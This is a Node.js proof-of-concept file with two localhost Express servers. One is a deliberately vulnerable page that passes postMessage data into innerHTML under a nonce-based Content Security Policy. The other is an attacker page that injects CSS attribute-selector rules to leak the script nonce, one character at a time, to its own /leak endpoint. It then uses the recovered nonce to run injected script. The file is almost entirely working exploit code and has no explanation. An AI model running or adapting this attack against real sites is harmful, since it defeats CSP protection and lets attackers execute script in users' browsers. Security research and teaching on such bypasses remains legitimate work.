const express = require('express')
const app1 = express()
const app2 = express()
var leaked = "";
app1.get('/', (req, res) => {
	let nonce = Math.random().toString(36).replace(/[^a-z]+/g, '');
	res.send(`
		<html>
			<head>
				<title>!!</title>
				<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-${nonce}'">
			</head>
			<body>
				DEBUG: nonce is ${nonce}
				<div id="inj"></div>
				<script nonce="${nonce}">
					window.onmessage = e=>(inj.innerHTML=e.data);
				</script>
			</body>
		</html>
	`)
})

app2.get('/leak',(req,res)=>{
	if(req.query.chr) leaked = req.query.chr
	res.send(leaked);
});

app2.get('/',(req,res)=>{
	res.send(`
		<html>
			<head>
				<title>!!</title>
			</head>
			<body>
				<div id=info></div>
				<script>
					let alph = "abcdefghijklmnopqrstuvwxyz";
					let template = '<style>script[nonce^="$NONCE$$CHAR$"] {display:block;background: url("http://localhost:4000/leak?chr=$CHAR$"); }</style>';
					let nonce = "";
					let j = false;
					function next(){
						fetch("/leak").then(r=>r.text()).then(r=>(nonce+=r,injStyles()));
					}

					function injStyles(){
						info.innerText = 'Trying: $NONCE$'.replace('$NONCE$',nonce);
						let inj = '<iframe srcdoc="<script nonce=$NONCE$>alert(1337)<\\/script>"></iframe>'.replace("$NONCE$",nonce);
						let chridx = 0;
						for(let i =0;i<alph.length;i++){
							inj += template.replaceAll("$NONCE$",nonce).replaceAll("$CHAR$",alph[chridx++]);
						}
						window.lol.postMessage(inj,"*");
						setTimeout(next,1000);
					}

				</script>
				<iframe src="http://localhost:3000/" name="lol" onload="injStyles()"></iframe>
			</body>
		</html>
	`)
});

app1.listen(3000)
app2.listen(4000)